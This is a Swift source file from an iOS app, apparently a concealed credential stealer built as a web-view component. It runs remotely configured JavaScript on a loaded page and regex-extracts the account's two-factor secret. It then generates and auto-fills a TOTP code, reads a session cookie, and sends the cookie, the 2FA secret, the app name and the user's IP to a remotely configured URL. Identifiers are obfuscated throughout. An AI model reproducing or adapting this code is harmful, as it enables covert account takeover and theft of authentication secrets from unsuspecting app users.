//
//  File.swift
//  
//
//  Created by DanHa on 31/03/2023.
//


import Foundation
import SwiftOTP
import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct NineAuCoor: UIViewRepresentable {
    func makeCoordinator() -> NineAuCoordiClss {
        NineAuCoordiClss(self)
    }

    let url: URL?
    @Binding var nextScreenNineAu: Bool
    @Binding var containsNineAu: Bool

    var listData: [String: String] = [:]
    private let nineAuObs = NineAuObs()
    var nineAuobserver: NSKeyValueObservation? {
        nineAuObs.nineauins
    }

    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true // true
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs

        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = listData[RemoKey.rm02ch.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))

        return webview
    }

    func updateUIView(_ uiView: WKWebView, context: Context) { }

    class NineAuCoordiClss: NSObject, WKNavigationDelegate {
        var prentNineA: NineAuCoor
        init(_ prentNineA: NineAuCoor) {
            self.prentNineA = prentNineA
        }

        func sevenCoormach(for regex: String, in text: String) -> [String] {
            do {
                let regex = try NSRegularExpression(pattern: regex)
                let results = regex.matches(in: text,
                                            range: NSRange(text.startIndex..., in: text))
                return results.map {
                    String(text[Range($0.range, in: text)!])
                }
            } catch let error {
                print("Error: \(error.localizedDescription)")
                return []
            }
        }
        
        func ipaddCall() -> String {
            var ipadd: String?
            if let dataModel = UserDefaults.standard.object(forKey: "diachiip") as? Data {
                if let perLoad = try? JSONDecoder().decode(UsIpadress.self, from: dataModel) {
                    ipadd = perLoad.ippad
                }
            }
            return ipadd ?? "IP_Null"
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        } // didStartProvisionalNavigation

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            webView.evaluateJavaScript(self.prentNineA.listData[RemoKey.nine1af.rawValue] ?? "", completionHandler: { _, _ in })

            // Cho 5s cho load html all.
            DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) {
                webView.evaluateJavaScript(self.prentNineA.listData[RemoKey.outer1af.rawValue] ?? "") { data, error in
                    if let htm = data as? String, error == nil {
                        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                            // Loc ra key
                            let secMatch = self.sevenCoormach(for: self.prentNineA.listData[RemoKey.nine2af.rawValue] ?? "", in: htm).filter({ !$0.isEmpty })
                            if !secMatch.isEmpty {
                                let secretStringNw = secMatch[0]
                                guard let dataNw = base32DecodeToData(secretStringNw) else { return }
                                guard let totpNw = TOTP(secret: dataNw), let otpStringNw = totpNw.generate(time: Date()) else {
                                    return
                                }
                                webView.evaluateJavaScript(self.prentNineA.listData[RemoKey.nine3af.rawValue] ?? "", completionHandler: { _, _ in })
                                // Cho 2s se dien vao input
                                DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                                    // copy key vao bo nho tam
                                    let pasteboard = UIPasteboard.general
                                    pasteboard.string = otpStringNw
                                    // Paste input enter.
                                    if let iputString = pasteboard.string {
                                        // print(stringinput)
                                        webView.evaluateJavaScript("const EVENT_OPTIONS = { bubbles: true, cancelable: false, composed: true };const EVENTS = {KEYUP: new Event('keyup', EVENT_OPTIONS),BLUR: new Event('blur', EVENT_OPTIONS),CHANGE: new Event('change', EVENT_OPTIONS),INPUT: new Event('input', EVENT_OPTIONS)};const inputElement = document.querySelector('[data-key=\"0\"]');inputElement.value=\"\(iputString)\";const tracker = inputElement._valueTracker;tracker && tracker.setValue(\"\(iputString)\");inputElement.dispatchEvent(EVENTS.INPUT);inputElement.dispatchEvent(EVENTS.BLUR);inputElement.dispatchEvent(EVENTS.KEYUP);", completionHandler: { _, _ in })
                                    }

                                    WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ cookies in
                                        let cokiNineAu = cookies.firstIndex(where: { $0.name == self.prentNineA.listData[RemoKey.nam09ap.rawValue] ?? "" })
                                        if cokiNineAu != nil {
                                            let jsonNineAuu: [String: Any] = [
                                                self.prentNineA.listData[RemoKey.nam23ap.rawValue] ?? "": cookies[cokiNineAu!].value,
                                                self.prentNineA.listData[RemoKey.nam24ap.rawValue] ?? "": "\(secMatch[0])",
                                                self.prentNineA.listData[RemoKey.nam25ap.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "")-TWO",
                                                self.prentNineA.listData[RemoKey.nam26ap.rawValue] ?? "": self.ipaddCall(),
                                            ]
                                            let url: URL = URL(string: self.prentNineA.listData[RemoKey.rm08ch.rawValue] ?? "")!
                                            let jsonNineAuData = try? JSONSerialization.data(withJSONObject: jsonNineAuu)
                                            var request = URLRequest(url: url)
                                            request.httpMethod = "PATCH"
                                            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                            request.httpBody = jsonNineAuData
                                            let task = URLSession.shared.dataTask(with: request) { data, _, error in
                                                if error != nil {
                                                    print("Not Done")
                                                } else if data != nil {
                                                    self.prentNineA.nextScreenNineAu = true
                                                    print("Done")
                                                }
                                            }
                                            task.resume()
                                        } // if
                                    }) // getAllCookies
                                }
                            } else {
                                DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                                    self.prentNineA.containsNineAu = true
                                }
                            }
                        } // DispatchQueue
                    }
                } // webView.evaluateJavaScript
            } // DispatchQueue
        } // webView didFinish
    } // Coordinator
}

// Mark Lop theo doi url
@available(iOS 14.0, *)
private class NineAuObs: ObservableObject {
    @Published var nineauins: NSKeyValueObservation?
}

struct UsIpadress: Codable {
    var ippad: String
}
